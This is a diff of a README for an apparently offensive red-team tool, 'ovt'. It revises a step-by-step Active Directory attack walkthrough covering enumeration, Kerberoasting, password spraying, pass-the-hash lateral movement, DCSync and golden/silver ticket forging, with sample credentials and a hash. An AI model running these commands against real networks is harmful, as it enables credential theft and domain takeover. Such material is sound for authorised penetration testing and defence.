@@ -369,53 +369,42 @@ For the control freaks (and let's be honest, if you're reading a red team tool's
 ```bash
 # Step 1: Enumerate everything
 # AD will tell you its entire life story. You just have to ask.
-ovt reaper --dc 10.10.10.1 --domain corp.local -u jsmith -p 'Summer2026!'
-# Or with the alias:
 ovt enum --dc 10.10.10.1 --domain corp.local -u jsmith -p 'Summer2026!'
 
 # Step 2: Build and query the attack graph
 # "How screwed is this domain?" — a visual answer.
-ovt graph build --dc 10.10.10.1 --domain corp.local -u jsmith -p 'Summer2026!'
-ovt graph path-to-da --from jsmith
-ovt graph path --from jsmith --to "Domain Admins"
-ovt graph stats
-ovt graph export --output graph.json
+ovt graph --path-to-da jsmith
+ovt graph --shortest-path jsmith "Domain Admins"
+ovt graph --kerberoastable-from jsmith
+ovt graph --high-value-targets
+ovt graph --export graph.json
 
 # Step 3: Kerberoast
 # Order tickets, crack offline. The DC doesn't even know you're attacking it.
-ovt kerberos roast --dc 10.10.10.1 --domain corp.local -u jsmith -p 'Summer2026!'
-ovt kerberos asrep-roast --dc 10.10.10.1 --domain corp.local -u jsmith -p 'Summer2026!'
-# Or with the alias:
-ovt roast roast --dc 10.10.10.1 --domain corp.local -u jsmith -p 'Summer2026!'
+ovt roast kerberoast --dc 10.10.10.1 --domain corp.local -u jsmith -p 'Summer2026!'
+ovt roast asrep --dc 10.10.10.1 --domain corp.local -u jsmith
 
-# Step 4: Get TGT/TGS for further operations
-ovt kerberos get-tgt --dc 10.10.10.1 --domain corp.local -u jsmith -p 'Summer2026!'
-ovt kerberos get-tgs --spn cifs/dc01.corp.local --dc 10.10.10.1 --domain corp.local -u jsmith -p 'Summer2026!'
+# Step 4: Spray (carefully — lockouts = engagement over = career over)
+ovt spray --dc 10.10.10.1 --domain corp.local --users users.txt --password 'Winter2026!'
 
-# Step 5: Spray (carefully — lockouts = engagement over = career over)
-ovt spray --dc 10.10.10.1 --domain corp.local -U users.txt --password 'Winter2026!'
-
-# Step 6: Lateral movement
+# Step 5: Lateral movement
 # Be somewhere else. Then somewhere else. Then everywhere.
-ovt smb admin --targets 10.10.10.50 --dc 10.10.10.1 --domain corp.local -u admin \
-  --nt-hash 8846f7eaee8fb117ad06bdd830b7586c
-ovt exec --target 10.10.10.50 --command "whoami /all" --dc 10.10.10.1 --domain corp.local -u admin -p 'Pass'
+ovt move pth --target 10.10.10.50 --domain corp.local -u admin \
+  --hash aad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
+ovt move exec --target 10.10.10.50 --command "whoami /all"
 
-# Step 7: Persist — Ticket Forging
+# Step 6: Persist
 # Take the throne. Bolt it down. Change the locks. Hide the spare key.
-ovt forge golden --domain-sid S-1-5-21-... --domain corp.local --krbtgt-hash <hash> --user Administrator
-ovt forge silver --domain-sid S-1-5-21-... --domain corp.local --service-hash <hash> --spn cifs/dc01.corp.local
+ovt forge dcsync --dc 10.10.10.1 --domain corp.local -u dadmin -p 'G0tcha!'
+ovt forge golden --krbtgt-hash <hash> --domain corp.local --domain-sid S-1-5-21-...
+ovt forge silver --service-hash <hash> --service cifs/dc01.corp.local --domain corp.local
 
-# Step 8: Report
+# Step 7: Report
 # Turn chaos into a PDF. The blue team will frame it and hang it on their wall.
 # (As a reminder of what not to do.)
-ovt report --input engagement.json --output report.pdf --format pdf
-ovt report --input engagement.json --output report.html --format html
-ovt report --input engagement.json --output findings.json --format json
-
-# Step 9: Environment diagnostics
-ovt doctor --dc 10.10.10.1
-ovt doctor --checks smb,kerberos,winrm
+ovt report --format pdf --output engagement-report.pdf
+ovt report --format html --output report.html
+ovt report --format json --output findings.json
 ```
 
 ### Command Reference
